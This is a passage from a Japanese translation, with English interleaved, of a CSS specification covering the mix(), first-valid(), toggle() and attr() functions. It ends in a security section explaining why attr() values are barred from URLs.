所与の 2 個の `transform-list$t 値を所与の `progress$t による進捗へ補間した結果になる。
◎
The used value of a valid transform-mix() is the result of interpolating these two values to the progress given by &lt;progress&gt;.＼
</li>
	<li>
<p>
`算出d値$は：
</p>
		<ul>
			<li>
［
所与の `progress^t が `percentage$t に【！can be】算出される
］かつ［
所与の 2 個の `transform-list$t を使用~値の時点での情報なしに補間できる
］場合、
所与の 2 個の `transform-list$t の算出d値を所与の `progress^t 値へ補間した結果になる。
</li>
			<li>
他の場合、
そのまま `transform-mix^f 記法になるが，
その各~引数は各自の型に則って算出される。
</li>
		</ul>
◎
If the &lt;progress&gt; value can be computed to a &lt;percentage&gt;, and the &lt;transform-list&gt;s can be interpolated without used-value-time information, then the computed value is likewise the result of interpolating the two computed values to that &lt;progress&gt; value; it is otherwise the transform-mix() notation itself with its arguments each computed according to their type.
</li>
</ul>

<p>
`transform-mix$f 自身は、
`transform-function$t である。
◎
transform-mix() is, itself, a &lt;transform-function&gt;.
</p>

<p class="trans-note">【
`transform-list^t どうしを補間した結果は，
一般に変形~関数たちが成す~listになるので、
これは不正確に見えるが、
~listを成す変形~関数をすべて累積した結果を成す 1 個の `transform-function^t として解釈されるのかもしれない。
】</p>

		</section>
		<section id="mix">
<h3 title="Interpolated Property Values: the mix() notation">5.6. 補間された~prop値： `mix^f 記法</h3>

<p>
所与の~prop用の 2 個の値の`補間$は、
`mix@f
`混合-記法$により表現できる
— それは、
2 つの代替な構文~patternを~supportする：
◎
Interpolation of any two property values can be represented by the mix() mix notation, which supports two alternative syntax patterns:
</p>

<pre class="prod">
`mix()@t
	= mix( `progress$t , `whole-value$t? , `whole-value$t? )
	| mix( `progress$t &amp;&amp; of `animation-name$tp )
</pre>

<p>
1 個目の構文~代替は、
他の`混合-記法$と同様に，［
`混合-始端~値$を与える 1 個目の `whole-value$t,
`混合-終端~値$を与える 2 個目の `whole-value$t
］の合間において補間する。
2 個目の構文~代替は、
より複階的な補間~曲線を許容するため†，
~keyframeたちが成す集合††から対応している~prop宣言†††たちを`混合-進捗~値$を利用して補間する。
◎
The first syntax alternative, like other mix notations, interpolates between the first &lt;whole-value&gt; (its mix start value) and the second &lt;whole-value&gt; (its mix end value). The second uses the mix progress value to interpolate the corresponding property declarations from a set of keyframes, allowing for more complex interpolation curves.
◎
（削除漏れ）
Note: This functional notation uses semicolons to separate arguments rather than the more typical comma because the values themselves can contain commas.
</p>

<p class="trans-note">【††
`animation-name$tp が参照rする `keyframes$at 規則を成す`~keyframe~style規則$たちを指すと思われる。
】【†††
この関数を値に利用している~propと同じ名前を伴う~prop宣言を指すと思われる。
】【†
各~keyframeにて指定された［
`~keyframe選択子$／`~easing関数$
］も織り込まれることを意図しているものと思われる。
】</p>

<p>
`mix$f の`算出d値$は、
次に従う：
◎
↓</p>
<ul>
	<li>
1 個目の “標準な” `mix^f 記法で指定されていて，［
2 個の `whole-value$t が，それを指定した~prop用の値として補間-可能である
］かつ［
補間した結果は `mix$f を伴わずに表現できる
］場合
⇒
それら 2 個の値を［
`progress$t により与えられた進捗
］へ補間した結果になる。
◎
For the standard mix notation variant, if the two &lt;whole-value&gt;s being interpolated by mix() are interpolable as values for the property in which it is specified, and the interpolated value can be represented without mix(), the computed value of mix() is the result of interpolating these two values to the progress given by &lt;progress&gt;.＼
</li>
	<li>
<p>
他の場合
⇒
そのまま `mix^f `関数-記法$になるが、
その引数のうち
`progress$t 値は算出され，
`whole-value$t は（供されたなら）［
当の~prop用の値
］として算出される。
</p>

<p class="trans-note">【
2 個目の `mix^f 記法で指定された場合も，この場合に含まれるように思われる。
】</p>

◎
Otherwise, the computed value of mix() is the mix() functional notation itself with its &lt;progress&gt; value computed and its &lt;whole-value&gt;s (if provided) computed as values for this property.
</li>
</ul>

<div class="example">
<p>
`mix$f の利用のうちほとんどは、
算出d値の時点で解決されることになる：
◎
For example, most uses of mix() will resolve at computed-value time:
</p>

<pre class="lang-css">
color: mix(90%, red, blue);
/* <span class="comment">
は、
単純な補間を介して，次に算出される：
◎
via simple interpolation, computes to:
</span> */
color: rgb(10% 0 90%);

color: mix(90%, currentcolor, black);
/* <span class="comment">
算出d値の時点では全部的に解決し得ないが、
それでも，定義された表現がある：
◎
can’t be fully resolved at computed-value time, but still has a defined representation:
</span> */
color: color-mix(currentcolor 90%, black 10%);

float: mix(90%, left, right);
/* <span class="comment">
離散的に~animate可能
◎
discretely animatable
</span> */
float: right;
</pre>

<p>
が、
少数の事例では，中間的な表現は無い：
◎
But a few cases don’t have an intermediate representation:
</p>

<pre class="lang-css">
transform: mix(90%, translate(calc(1em + 50%)), rotate(30deg));
/* <span class="comment">
2 つの関数は合致しないので，
`matrix^f を介して補間されることになるが、
`translate^f は百分率を伴うので，
`matrix^f に転換するためには~layout情報が必要になる。
なので、
補間した値を実際には表現し得ない。
その結果、
次【の様な形】に算出される：
◎
because functions don’t match, it will interpolate via matrix(). But translate(%) needs layout information to turn into a matrix(), so the interpolated value can’t actually be represented. Computes to:
</span> */
transform: mix(90%, translate(calc(16px + 50%)), rotate(30deg));
transform: mix(90% of ripple);
</pre>
</div>

<p>
`mix$f 記法は、
`whole-value$t である。
加えて、
いずれかの `whole-value$t 引数が`~animate不可$である場合，当の記法は無効になる。
◎
The mix() notation is a &lt;whole-value&gt;. Additionally, if any of its &lt;whole-value&gt; arguments are not animatable, the notation is invalid.
</p>

<div class="example">
<p>
例えば，次に挙げる宣言は、
どれも無効になり，無視されることになる:
◎
For example, the following declarations are invalid, and will be ignored:
</p>

<pre class="lang-css">
/* <span class="comment">
始端~値が妥当でない
◎
Invalid start value
</span> */
color: mix(90%, #invalid, #F00);

/* <span class="comment">
`mix^f 関数が~propの値~全体を成していない
◎
Function is mixed with other values
</span> */
background: url(ocean) mix(10%, blue, yellow);

/* <span class="comment">
`animation-*^p は~animate可能でない
◎
'animation-*' is not animatable
</span> */
animation-delay: mix(0%, 0s, 2s);
</pre>
</div>

		</section>
	</section>
	<section id="value-insert">
<h2 title="Miscellaneous Value Substituting Functions">6. 値を代用する諸々の関数</h2>

		<section id="whole-value">
<h3 title="Representing An Entire Property Value: the &lt;whole-value&gt; type">6.1. ~prop値~全体の表現-法： `whole-value^t 型</h3>

<p>
この仕様が定義するいくつかの関数は、
所与の~propの “値~全体を成す” 場合にしか利用できない。
例えば、
<code class="css">`background-position$p: `toggle(50px 50px, center)^v;</code>
は妥当であるが，
<code class="css">`background-position^p: `toggle(50px, center) 50px^v;</code>
は妥当でない。
`whole-value$t 生成規則は、
そのような値を表現する。
◎
Several functions defined in this specification can only be used as the "whole value" of a property. For example, background-position: toggle(50px 50px, center); is valid, but background-position: toggle(50px, center) 50px; is not. The &lt;whole-value&gt; production represents these values.
</p>

<p>
すべての~propは、
その値~全体として `whole-value$t を暗黙的に受容する
— `~CSS全域~keyword$を値~全体として受容するのと同じく。
◎
All properties implicitly accept a &lt;whole-value&gt; as their entire value, just as they accept the CSS-wide keywords as their entire value.
</p>

<p>
`whole-value$t が，ある関数の成分~値【引数】として利用されたときも、［
それを利用した~propの値~全体を成すものとして，通常は妥当になる
］ような任意の~CSS値を表現する
（追加的な `whole-value$t 関数
【さらに入子にされた `whole-value$t を引数に含む関数？】
も含めて）。
しかしながら、
一部の関数は， `whole-value$t 引数に含めれるものを制約し得る。
◎
When used as a component value of a function, &lt;whole-value&gt; also represents any CSS value normally valid as the whole value of the property in which it is used (including additional &lt;whole-value&gt; functions). However, some functions may restrict what a &lt;whole-value&gt; argument can include.
</p>

		</section>
		<section id="first-valid">
<h3 title="Selecting the First Supported Value: the first-valid() notation">6.2. ~supportされる最初の値の選定-法： `first-valid^f 記法</h3>


<p>
~CSSは、
前方-互換な構文解析により漸進的な増補を~supportする。
作者は，~style規則~内で同じ~propを複数回
— 各~回に異なる値を利用しながら —
宣言でき、
~CSS~UAは，
それらのうち自身が解する最後のものを自動的に利用して，それ以外を棄てる。
この原則は、
`supports$at 規則との~~併用により，［
旧い~UA, 新たな~UAどちらでも きちんと働く~stylesheetを書く
］ことを作者に許容する。
◎
CSS supports progressive enhancement with its forward-compatible parsing: authors can declare the same property multiple times in a style rule, using different values each time, and a CSS UA will automatically use the last one that it understands and throw out the rest. This principle, together with the @supports rule, allows authors to write stylesheets that work well in old and new UAs simultaneously.
</p>

<p>
しかしながら、
`var$f 関数（あるいは、構文解析した後に解決される類似な代用~関数）の利用は，
この機能性を~~妨げる
— そのような どの~propも，構文解析-時点では妥当と見做すことが要求されるので。
◎
However, using var() (or similar substitution functions that resolve after parsing) thwarts this functionality; CSS UAs must assume any such property is valid at parse-time.
</p>

<p>
`first-valid@f
`関数-記法$は、
~fallback用の挙動を宣言の中に
— その構文解析に内在的になるよう —
~inline化する。
ほとんどの記法と違って、
その各~引数は，妥当な構文も妥当でない構文も受容する
— それは、
各~引数のうち，次を満たす最初のものを表現する
⇒
この記法を利用した~propの値~全体を成していたとするとき，
~UAにより~supportされる
（妥当な値として構文解析される）
◎
The first-valid() functional notation inlines the fallback behavior intrinsic to parsing declarations. Unlike most notations, it can accept any valid or invalid syntax in its arguments, and represents the first value among its arguments that is supported (parsed as valid) by the UA as the whole value of the property it’s used in.
</p>

<pre class="prod">
`first-valid()@t
	= first-valid( `declaration-value$t# )
</pre>

<p>
どの引数も当の~prop用の妥当な値を表現しない場合、
当の~propは，`算出d値の時点で無効$になる。
◎
If none of the arguments represent a valid value for the property, the property is invalid at computed-value time.
</p>

<p>
`first-valid$f は `whole-value$t である。
◎
first-valid() is a &lt;whole-value&gt;.
</p>

<p class="issue">
これは異なる名前にするべきか？
— この関数を追加するものと解決されるまで，
【どう命名するか】裁定し切れなかった。
◎
Should this have a different name? We didn’t quite decide on it during the resolution to add this.
</p>

<p class="note">注記：
`first-valid$f が［
その引数として実質的には `whole-value$t をとるにもかかわらず，
`declaration-value$t をとる
］ものと定義されるのは、
定義により，［
`その値は、それをとる宣言~用には妥当でないかもしれない^em
］事例で利用されることが意図されるので。
`declaration-value$t は、
それが合致するものに対し
— `whole-value$t と違って —
文脈に応じた妥当性の拘束を何も課さない。
◎
Note: Despite effectively taking &lt;whole-value&gt;s as its argument, first-valid() is instead defined to take &lt;declaration-value&gt;s because, by definition, it’s intended to be used in cases where its values might be invalid for the declaration it’s in. &lt;declaration-value&gt; imposes no contextual validity constraints on what it matches, unlike &lt;whole-value&gt;.
</p>

		</section>
		<section id="toggle-notation">
<h3 title="Toggling Between Values: toggle()">6.3. 一連の値の~toggle法： `toggle^f</h3>

<p>
`toggle@f
式は、
子孫~要素たちが
— 同じ値を継承する代わりに —
~listを成す各~値を巡回することを許容する。
◎
The toggle() expression allows descendant elements to cycle over a list of values instead of inheriting the same value.
</p>

<div class="example">
<p>
次の例は、
`em^e 要素を一般には~italic体にしつつ，~italic体の内側では~normal体に戻す：
◎
The following example makes &lt;em&gt; elements italic in general, but makes them normal if they’re inside something that’s italic:
</p>
<pre class="lang-css">
em { font-style: toggle(italic, normal); }
</pre>
</div>

<div class="example">
<p>
次の例は、
入子な~list用に，~markerたちを巡回する。
~marker図形は、
~top-levelの~listにおいては `disc$v になり，
その中に入子にされた~listにおいては
— 階が深まるごとに —
順に［
`circle$v, `square$v, `box^v
］になり，
（ 5 階の深さで）再び `disc$v から開始するようになる。
◎
The following example cycles markers for nested lists, so that a top level list has disc-shaped markers, but nested lists use circle, then square, then box, and then repeat through the list of marker shapes, starting again (for the 5th list deep) with disc.
</p>

<pre class="lang-css">
ul { list-style-type: toggle(disc, circle, square, box); }
</pre>
</div>

<p>
`toggle$f 式の構文は：
◎
The syntax of the toggle() expression is:
</p>

<pre class="prod">
`toggle()$t
	= toggle( `whole-value$t# )
</pre>

<p>
`toggle$f 記法は、
`whole-value$t である。
しかしながら、
入子にできないことに加え，［
`attr$f ／ `calc$f
］記法も包含できない
— そのような構成子を包含している宣言は無効になる。
◎
The toggle() notation is a &lt;whole-value&gt;. However, it is not allowed to be nested, nor may it contain attr() or calc() notations; declarations containing such constructs are invalid.
</p>

<div class="example">
<p>
次に挙げる `toggle$f 式は、
どれも無効になる：
◎
The following toggle() examples are all invalid:
</p>

<pre class="lang-css">
background-position: 10px toggle(50px, 100px);
/* <span class="comment">
`toggle$f は~propの値~全体を成していなければナラナイ。
◎
toggle() must be the sole value of the property
</span> */

list-style-type: toggle(disc, 50px);
/* <span class="comment">
`50px^v は `list-style-type$p 用の妥当な値でない。
◎
50px isn’t a valid value of 'list-style-type'
</span> */
</pre>
</div>

<div class="algo">
<p>
`toggle$f 式 %式 の`算出d値$は、
次に従って決定される：
</p>
<ol>
	<li>
%最初の値 ~LET ε
</li>
	<li>
%初回の反復か ~SET ~F
</li>
	<li>
%前回の反復で合致したか ~SET ~F
</li>
	<li>
<p>
%式 の
~EACH( 引数 %引数 )
に対し，順に：
</p>
		<ol>
			<li>
%値 ~LET ［
%引数 が %式 を利用している~propの値~全体を成していた
］とするとき，~propの`算出d値$を評価した結果
</li>
			<li>
~IF［
%前回の反復で合致したか ~EQ ~T
］
⇒
~RET %値
</li>
			<li>
~IF［
%初回の反復か ~EQ ~T
］
⇒＃
%初回の反復か ~SET ~F；
%最初の値 ~SET %値
</li>
			<li>
~IF［
%値 ~EQ %式 を利用している~propの`継承d値$
］
⇒
%前回の反復で合致したか ~SET ~T
</li>
		</ol>
	</li>
	<li>
~RET %最初の値
</li>
</ol>
◎
To determine the computed value of toggle(), first evaluate each argument as if it were the sole value of the property in which toggle() is placed to determine the computed value that each represents, called Cn for the n-th argument to toggle(). Then, compare the property’s inherited value with each Cn. For the earliest Cn that matches the inherited value, the computed value of toggle() is Cn+1. If the match was the last argument in the list, or there was no match, the computed value of toggle() is the computed value that the first argument represents.
</div>

<p class="note">注記：
したがって， `toggle$f 内で同じ値が繰返された場合、
~listは短絡されることになる。
例えば， `toggle(1em, 2em, 1em, 4em)^v は、
`toggle(1em, 2em)^v と等価になる。
◎
Note: This means that repeating values in a toggle() short-circuits the list. For example toggle(1em, 2em, 1em, 4em) will be equivalent to toggle(1em, 2em).
</p>

<p class="note">注記：
`toggle$f は，明示的に親の算出d値を調べるので、
継承されない~propであっても働く。
このことは、
継承されない~propに対しても働く `inherit$v ~keywordと類似する。
◎
Note: That toggle() explicitly looks at the computed value of the parent, so it works even on non-inherited properties. This is similar to the inherit keyword, which works even on non-inherited properties.
</p>

<p class="note">注記：
~propの`算出d値$は、
抽象的な［
値たちが成す集合
］であり，特定0の直列化ではない `CSS21$r ので、
算出d値どうしの比較は常に一義的になり，
期待される結果になるべきである。
例えば， `CSS21$r における `background-position$p の算出d値は、
各自が［
絶対~長さ／百分率
］として表現される 2 個の~offsetだけからなるので、［
宣言 <span class="css">`background-position^p: `top center^v</span>
］と［
宣言 <span class="css">`background-position^p: `50% 0%^v</span>
］が生産する算出d値は，一致する。
~prop定義の “算出d値” の欄が何かを［
多義的／厳密~過ぎ
］に定義すると見受けられる場合は、
修正できるよう`~feedback＠#sotd$を供されたし。
◎
Note: That the computed value of a property is an abstract set of values, not a particular serialization [CSS21], so comparison between computed values should always be unambiguous and have the expected result. For example, a Level 2 background-position computed value is just two offsets, each represented as an absolute length or a percentage, so the declarations background-position: top center and background-position: 50% 0% produce identical computed values. If the "Computed Value" line of a property definition seems to define something ambiguous or overly strict, please provide feedback so we can fix it.
</p>

<p>
`toggle$f が`略式~prop$に利用された場合、
その各~下位propの値も `toggle$f 値になるが、
その各~引数は，元の `toggle$f 式の各~引数に対し［
それが当の略式~propの値~全体を成していたとするとき，下位propが受取ることになる値
］に設定される。
◎
If toggle() is used on a shorthand property, it sets each of its longhands to a toggle() value with arguments corresponding to what the longhand would have received had each of the original toggle() arguments been the sole value of the shorthand.
</p>

<div class="example">
<p>
次の略式~prop宣言は：
◎
For example, the following shorthand declaration:
</p>

<pre class="lang-css">
margin: toggle(1px 2px, 4px, 1px 5px 4px);
</pre>

<p>
次の下位prop宣言と等価になる：
◎
is equivalent to the following longhand declarations:
</p>

<pre class="lang-css">
margin-top:    toggle(1px, 4px, 1px);
margin-right:  toggle(2px, 4px, 5px);
margin-bottom: toggle(1px, 4px, 4px);
margin-left:   toggle(2px, 4px, 5px);
</pre>

<p>
［
上端~margin／下端~margin
］は、［
`1px^v ／ `4px^v
］が 2 回~現れているので，
2 個の値のみを巡回する。
一方で，［
左端~margin／右端~margin
］は、 3 個の値を巡回することになる。
言い換えれば、
上の宣言から得られる算出d値は，次の下位prop宣言と同じになる：
◎
Note that, since 1px appears twice in the top margin and 4px appears twice in bottom margin, they will cycle between only two values while the left and right margins cycle through three. In other words, the declarations above will yield the same computed values as the longhand declarations below:
</p>

<pre class="lang-css">
margin-top:    toggle(1px, 4px);
margin-right:  toggle(2px, 4px, 5px);
margin-bottom: toggle(1px, 4px);
margin-left:   toggle(2px, 4px, 5px);
</pre>

<p>
その結果は、
意図されるものではなかろう。
◎
which may not be what was intended.
</p>
</div>

		</section>
		<section id="attr-notation">
<h3 title="Attribute References: the attr() function">6.4. 属性~参照： `attr^f 関数</h3>

<p>
`attr@f
関数は、［
それを利用している~propが適用される`要素$の ある`属性$
］を参照し，その`属性$の値で`代用-$される
（ `var$f 関数が`~custom~prop$の値で代用されるのと類似に）。
◎
The attr() function substitutes the value of an attribute on an element into a property, similar to how the var() function substitutes a custom property value into a function.
</p>

<pre class="prod">
attr()
	= attr(`attr-name$t `attr-type$t? , `declaration-value$t?)

`attr-name@t
	= [ `ident-token$t '|' ]? `ident-token$t

`attr-type@t
	= `string$v
	| `ident$v
	| `color$v
	| `number$v
	| `percentage$v
	| `length$v
	| `angle$v
	| `time$v
	| `frequency$v
	| `flex$v
	| `dimension-unit$t
</pre>

<p>
`dimension-unit@t
生成規則は、
次に挙げるものに合致する：
◎
The &lt;dimension-unit&gt; production matches＼
</p>
<ul>
	<li>
~literal `%^l
（すなわち， .値 `%^l を伴う `delim-token$t ）
◎
a literal "%" character (that is, a &lt;delim-token&gt; with a value of "%")＼
</li>
	<li>
`ident-token$t のうち，その .値 は［
`length$t ／ `angle$t ／ `time$t ／ `frequency$t ／ `flex$t
］値~用の~CSS単位（ `px$u や `ms$u など ）であるもの。
◎
or an ident whose value is any of the CSS units for &lt;length&gt;, &lt;angle&gt;, &lt;time&gt;, &lt;frequency&gt;, or &lt;flex&gt; values (such as px or ms).
</li>
</ul>

<p>
`attr$f の各~引数は：
◎
The arguments of attr() are:
</p>
<dl>
	<dt>`attr-name$t</dt>
	<dd>
参照している属性の名前を与える
— それは、
`wq-name$t `SELECTORS-3$r に類似するが、
それを成す最初の成分【名前空間~接頭辞】は，~wildcard【任意の名前空間を表現する `*^v 】をとり得ない。
◎
Gives the name of the attribute being referenced, similar to &lt;wq-name&gt; (from [SELECTORS-3]) but without the possibility of a wildcard prefix.
</dd>
	<dd>
名前空間が指定されなかった場合
（ `attr(foo)^v の様に，識別子だけが与えられた場合）
~NULL名前空間が含意される。
（名前空間を伴う属性は稀なので、
通例的には，これが欲されるものになる。
特に、［
~HTML／~SVG
］には，名前空間を伴う属性は無い。）
◎
If no namespace is specified (just an identifier is given, like attr(foo)), the null namespace is implied. (This is usually what’s desired, as namespaced attributes are rare. In particular, HTML and SVG do not contain namespaced attributes.)＼
</dd>
	<dd>
`属性~選択子$と同じく、
`attr-name$t が文字大小区別かどうかは，文書~言語に依存する。
◎
As with attribute selectors, the case-sensitivity of &lt;attr-name&gt; depends on the document language.
</dd>
	<dd>
ある［
要素／疑似要素
］に適用される~propにて利用された `attr$f は、［
当の要素／当の疑似要素の`出自の要素$
］の所与の名前を伴う属性を参照する。
◎
If attr() is used in a property applied to an element, it references the attribute of the given name on that element; if applied to a pseudo-element, the attribute is looked up on the pseudo-element’s originating element.
</dd>

	<dt>`attr-type$t</dt>
	<dd>
参照された属性の値が，どの種類の~CSS値として解釈されるかを
— および、
もしあれば，値に対し行われる特別な構文解析も —
指定する。
解釈した結果が当の `attr$f の
`代用~値@
を与える。
◎
Specifies what kind of CSS value the attribute’s value will be interpreted into (the attr()’s substitution value) and what, if any, special parsing will be done to the value.
</dd>
	<dd>
アリな値，それらの挙動は、
<a href="#attr-types">§ `attr^f 型</a>
にて定義される。
◎
The possible values and their behavior are defined in § 6.4.1 attr() Types.
</dd>
	<dd>
省略された場合、
`string$v が既定になる。
◎
Defaults to string if omitted.
</dd>

	<dt>`declaration-value$t</dt>
	<dd>
~fallback値を指定する
— それは、
参照された属性［
が欠落な場合／
の値を指定された型として構文解析するのに失敗した場合
］、
当の`attr$f は，この~fallback値で`代用-$されることになる。
◎
Specifies a fallback value for the attr(), which will be substituted instead of the attribute’s value if the attribute is missing or fails to parse as the specified type.
</dd>
	<dd>
省略された場合の既定の~fallback値は、
`attr-type$t 引数に応じて
⇒＃
`string$v ならば空~文字列になる／
~ELSE_ `無効が保証される値$になる
◎
If the &lt;attr-type&gt; argument is string, defaults to the empty string if omitted; otherwise, defaults to the guaranteed-invalid value if omitted.
</dd>
</dl>

<p>
~propが包含している各 `attr$f 関数が，どれも構文上は妥当な場合、
~prop全体の文法は，構文解析-時点では妥当であると見做すモノトスル。
構文は、
`attr^f 関数が`代用-$された後の算出d値の時点に限り，検査される。
◎
If a property contains one or more attr() functions, and those functions are syntactically valid, the entire property’s grammar must be assumed to be valid at parse time. It is only syntax-checked at computed-value time, after attr() functions have been substituted.
</p>

<div class="note">
<p>注記：
~fallback値【！既定の値】の型は、
`attr-type$t 【！所与の型】と一致する必要は無いことに注意。
一例として、
作者により要求された属性の型が `px$u の場合でも，
~fallback値は `auto^v をとり得る
— <code class="css">`width$p: `attr(size px, auto)^v;</code>
の様に。
◎
Note that the default value need not be of the type given. For instance, if the type required of the attribute by the author is px, the default could still be auto, like in width: attr(size px, auto);.
</p>
</div>

			<section id="attr-types">
<h4 title="attr() Types">6.4.1. `attr$f 型</h4>

<div class="p">
<p>
`attr$f 関数の挙動は、
`attr-type$t 引数の値にも依存する
— 以下においては：
</p>
<ul>
	<li>
%属性~値 は、
関数が参照している属性の値をそのまま表すとする。
（属性が欠落な場合、
上で述べたとおり~fallback値が利用されることになる）。
</li>
	<li>
%成分~値 は、
次の結果を表すとする
⇒
`成分~値を構文解析する$( %属性~値 )
（結果が構文-~errorならば、~fallback値が利用されることになる）
</li>
</ul>
◎
The behavior of the attr() function depends partially on the value of the &lt;attr-type&gt; argument:
</div>

<dl>
	<dt>`string@v</dt>
	<dd>
`代用~値$は、
~CSS文字列としての %属性~値 になる。
（ %属性~値 に対し遂行される~CSS構文解析や “整理” は無い。）
◎
The substitution value is a CSS string, whose value is the literal value of the attribute. (No CSS parsing or "cleanup" of the value is performed.)
</dd>
	<dd>
~fallbackを誘発する値は無い。
◎
No value triggers fallback.
</dd>

	<dt>`ident@v</dt>
	<dd>
<p>
`代用~値$は、
%属性~値 から`前後の~ASCII空白~列を剥いだ$結果 %結果 に応じて：
</p>
		<ul class="switch">
			<li>
［
空~文字列 ／ `~CSS全域~keyword$ ／ `default^v
］の場合は無い。
【おそらく，~ASCII文字無視。】
</li>
			<li>
他の場合、
`custom-ident$t としての %結果 になる。
（ %結果 に対し遂行される~CSS構文解析は無い）。
</li>
		</ul>
◎
The substitution value is a CSS &lt;custom-ident&gt;, whose value is the literal value of the attribute, with leading and trailing ASCII whitespace stripped. (No CSS parsing of the value is performed.)
◎
If the attribute value, after trimming, is the empty string, there is instead no substitution value.
◎
If the &lt;custom-ident&gt;’s value is a CSS-wide keyword or default, there is instead no substitution value.
</dd>

	<dt>`color@v</dt>
	<dd>
`代用~値$は、
%成分~値 が［
`hex-color$t である／
`ident-token$t であって，その.値は`有名~色$である
］ならば，
%成分~値 が表現する `color$t になる。
◎
Parse a component value from the attribute’s value. If the result is a &lt;hex-color&gt; or a named color ident, the substitution value is that result as a &lt;color&gt;.
</dd>
	<dd>
他の場合、
`代用~値$は無い。
◎
Otherwise there is no substitution value.
</dd>

	<dt>`number@v</dt>
	<dd>
`代用~値$は、
%成分~値 は `number-token$t であるならば，
%成分~値 【が表現する `number$t 値（または `integer$t 値）】になる。
◎
Parse a component value from the attribute’s value. If the result is a &lt;number-token&gt;, the result is the substitution value.
</dd>
	<dd>
他の場合、
`代用~値$は無い。
◎
Otherwise, there is no substitution value.
</dd>

	<dt>`percentage@v</dt>
	<dd>
`代用~値$は、
%成分~値 は `percentage-token$t であるならば，
%成分~値 【が表現する `percentage$t 値】になる。
◎
Parse a component value from the attribute’s value. If the result is a &lt;percentage-token&gt;, the result is the substitution value.
</dd>
	<dd>
他の場合、
`代用~値$は無い。
◎
Otherwise, there is no substitution value.
</dd>

	<dt>`length@v</dt>
	<dt>`angle@v</dt>
	<dt>`time@v</dt>
	<dt>`frequency@v</dt>
	<dt>`flex@v</dt>
	<dd>
`代用~値$は、［
%成分~値 は `dimension-token$t であって，その .単位 は所与の型に合致する
］ならば，
%成分~値 【が表現する`次元$】になる。
◎
Parse a component value from the attribute’s value. If the result is a &lt;dimension-token&gt; whose unit matches the given type, the result is the substitution value.
</dd>
	<dd>
他の場合、
`代用~値$は無い。
◎
Otherwise, there is no substitution value.
</dd>

	<dt id="valdef-attr-dimension-unit">`dimension-unit$t</dt>
	<dd>
`代用~値$は、
%成分~値 は `number-token$t であるならば，［
%成分~値 の .値, 所与の単位
］を伴う`次元$になる。
◎
Parse a component value from the attribute’s value. If the result is a &lt;number-token&gt;, the substitution value is a dimension with the result’s value, and the given unit.
</dd>
	<dd>
他の場合、
`代用~値$は無い。
◎
Otherwise, there is no substitution value.
</dd>
</dl>

<p class="issue">
`attr^f の`代用~値$として，［
すべての数量-型~用には`~math関数$／
“色” 用には色~関数
］を許容するよう求まれるか？
編集者は そう~~考えているが、
代用~値が更に参照~関数を包含していないことを確かめるため，内容を検査する必要もある
— <code>`foo^a="`rgb(var(--red), 0, 0)^v"</code> は、
`attr(foo color)^v 用には違法になる必要がある。
◎
Do we want to allow math functions as attr values for all the numeric types? And color functions for "color"? I think we do, but I’d have to check the contents to make sure they don’t contain further reference functions; foo="rgb(var(--red), 0, 0)" needs to be illegal for attr(foo color).
</p>

<div class="example">
<p>
`attr$f を利用して，
~XML~file内の~dataを視覚的に~~説明する例：
◎
This example shows the use of attr() to visually illustrate data in an XML file:
</p>

`attr-types-1^xCode
</div>

			</section>
			<section id="attr-substitution">
<h4 title="attr() Substitution">6.4.2. `attr$f の代用</h4>

<p class="issue">
`attr$f と `var$f は，同時に代用されるので、
“`var$f を`代用する＠~CSSVAR#substitute-a-var$” は，おそらく［
これらの関数どちらにも利用される，より一般な “参照を代用する”
］に書き直すべきである。
◎
attr() and var() substitute at the same time, so I should probably rewrite substitute a var() to be more generally about "substitute a reference" and just use that for both of these functions.
</p>

<p>
`attr$f 関数は、
算出d値の時点で`代用-$される。
所与の宣言が，
すべての `attr^f 関数が代用された後において文法に合致しない場合、
当の宣言は，`算出d値の時点で無効$になる。
◎
attr() functions are substituted at computed-value time. If a declaration, once all attr() functions are substituted in, does not match its declared grammar, the declaration is invalid at computed-value time.
</p>

<div class="algo">
<p>
`attr$f 関数 %関数 を
`代用する@
ときは：
◎
To substitute an attr():
</p>
<ol>
	<li>
~IF［
%関数 に`代用~値$は在る
］
⇒
%関数 を`代用~値$で置換する
◎
If the attr() function has a substitution value, replace the attr() function by the substitution value.
</li>
	<li>
<p>
~ELIF［
%関数 の最後の引数として~fallback値 %~fallback は在る
］：
</p>
		<ol>
			<li>
%~fallback 内の
~EACH( ［
`var$f ／ `attr$f
］ 参照 %参照 )
に対し
⇒
%~fallback 内の %参照 を［
`代用する＠~CSSVAR#substitute-a-var$／`代用する$
］
</li>
			<li>
%関数 を %~fallback で置換する
</li>
		</ol>
◎
Otherwise, if the attr() function has a fallback value as its last argument, replace the attr() function by the fallback value. If there are any var() or attr() references in the fallback, substitute them as well.
</li>
	<li>
~ELSE
⇒
%関数 を利用している~propは、
`算出d値の時点で無効$になる
◎
Otherwise, the property containing the attr() function is invalid at computed-value time.
</li>
</ol>
</div>

			</section>
			<section id="attr-security">
<h4 title="Security">6.4.3. ~security</h4>

<p>
`attr$f 関数が参照する属性は、
当の~pageにより~style付け用に利用されるものとは決して意図されない，敏感な情報
（例：~page上の~scriptにより利用される~security~token）
を包含するかもしれない。
◎
An attr() function can reference attributes that were never intended by the page to be used for styling, and might contain sensitive information (for example, a security token used by scripts on the page).
</p>

<p>
これは、
一般には，~~問題にならない。
ほとんどの状況下では、
`attr$f を利用しても，［
~pageから情報を抽出して，それを敵対的な主体へ送信する
］ことは困難なので。
例外は、
~URLである。
第三者-主体~CSSが許容される下で、
純粋に~CSSから，ある~URLを任意な属性の値で構築できた場合、
属性~内に格納された情報は，敵対的な主体へ容易に送信できるようになる。
◎
In general, this is fine. It is difficult to use attr() to extract information from a page and send it to a hostile party, in most circumstances. The exception to this is URLs. If a URL can be constructed with the value of an arbitrary attribute, purely from CSS, it can easily send any information stored in attributes to a hostile party, if 3rd-party CSS is allowed at all.
</p>

<p>
この理由から、
`attr$f は `url$t 型にならないことに加え，
`url$t 値~内に `attr$f を利用することも
— 直接間接を問わず —
許容されない。
そのような `attr^f を利用した~propは、
無効になる。
◎
For this reason, attr() does not have a url type. Additionally, attr() is not allowed to be used in any &lt;url&gt; value, whether directly or indirectly. Doing so makes the property it’s used in invalid.
</p>

<div class="example">
<p>
例えば，次に挙げるものは、
いずれも無効になる：
◎
For example, all of the following are invalid:
</p>
<ul>
	<li>
`background-image: src(attr(foo))$p
⇒
直に利用できない。
◎
background-image: src(attr(foo)); - can’t use it directly.
</li>
	<li>
`background-image: image(attr(foo))$p
⇒
`url$t をとる他の関数~内でも，利用できない。
◎
background-image: image(attr(foo)) - can’t use it in other &lt;url&gt;-taking functions.
</li>
	<li>
